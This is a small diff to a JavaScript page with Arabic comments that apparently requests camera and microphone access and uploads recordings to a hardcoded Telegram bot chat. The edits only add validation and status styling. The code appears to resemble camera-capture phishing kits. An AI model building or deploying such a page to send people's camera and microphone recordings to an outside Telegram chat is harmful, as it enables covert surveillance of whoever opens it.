@@ -20,7 +20,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // طلب صلاحيات الوصول للكاميرا والميكروفون
     async function init() {
-        if (!BOT_TOKEN.includes(':') || CHAT_ID === '5372717005') {
+        if (!BOT_TOKEN.includes(':') || !CHAT_ID || CHAT_ID === '5372717005') {
             updateStatus('خطأ: يرجى إدخال بيانات البوت في ملف script.js أولاً.', 'error');
             return;
         }
@@ -46,6 +46,12 @@ document.addEventListener('DOMContentLoaded', () => {
         statusDiv.className = 'status'; // Reset classes
         if (type === 'recording') {
             statusDiv.classList.add('recording');
+        } else if (type === 'error') {
+            statusDiv.classList.add('error');
+        } else if (type === 'success') {
+            statusDiv.classList.add('success');
+        } else if (type === 'info') {
+            statusDiv.classList.add('info');
         }
     }
 
@@ -53,7 +59,7 @@ document.addEventListener('DOMContentLoaded', () => {
     async function sendToTelegram(formData, caption = '') {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/${formData.method}`;
         
-        const data = new FormData( );
+        const data = new FormData();
         data.append('chat_id', CHAT_ID);
         data.append(formData.fileType, formData.file, formData.fileName);
         if (caption) {
